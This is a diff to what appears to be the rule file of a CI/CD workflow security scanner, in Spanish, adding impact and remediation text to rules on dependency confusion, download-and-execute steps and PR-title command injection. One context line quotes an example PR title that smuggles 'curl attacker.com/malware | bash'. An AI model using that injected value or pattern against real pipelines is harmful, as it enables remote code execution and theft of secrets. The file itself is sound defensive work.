@@ -24,6 +24,8 @@
     Esto puede redirigir todas las instalaciones a un servidor controlado
     por el atacante, que servirá versiones modificadas de los paquetes.
     Técnica usada: Dependency Confusion + Registry Poisoning.
+  impact: "Dependency Confusion/Poisoning. Permite al atacante inyectar código malicioso en todas las dependencias del proyecto."
+  remediation: "Eliminar la configuración del registry de terceros o usar scopes específicos (@org:registry) con autenticación estricta."
 
 # ─── 2. Download-and-Execute Pattern ────────────────────────────────────────
 - id: "workflow-download-and-exec"
@@ -36,6 +38,8 @@
     en el runner. Patrón clásico de dropper de primera etapa.
     Un atacante puede controlar el servidor del que se descarga y
     cambiar el script después del merge (técnica "post-merge swap").
+  impact: "Remote Code Execution (RCE) en el runner de CI. Permite tomar control del entorno post-merge, robar secretos y alterar artefactos."
+  remediation: "Usar descargas verificadas con checksums (SHA256) en lugar de pipes a shells de sistema."
 
 # ─── 3. NPM Publish sin confirmación ────────────────────────────────────────
 - id: "workflow-auto-publish"
@@ -115,6 +119,8 @@
     El workflow interpola directamente contexto no confiable (título o cuerpo de PR)
     dentro de un bloque 'run'. Si el atacante nombra su PR "Title\"; curl attacker.com/malware | bash",
     obtendrá ejecución remota de código en el Action Runner.
+  impact: "Inyección de Comandos directa en el runner, logrando RCE mediante la creación de un PR malicioso."
+  remediation: "No interpolar contexto de eventos en bloques 'run'. Pasar los valores como variables de entorno (env:) primero."
 
 # ─── 10. Over-Permissive Global Tokens ───────────────────────────────────────
 - id: "workflow-global-write-all"
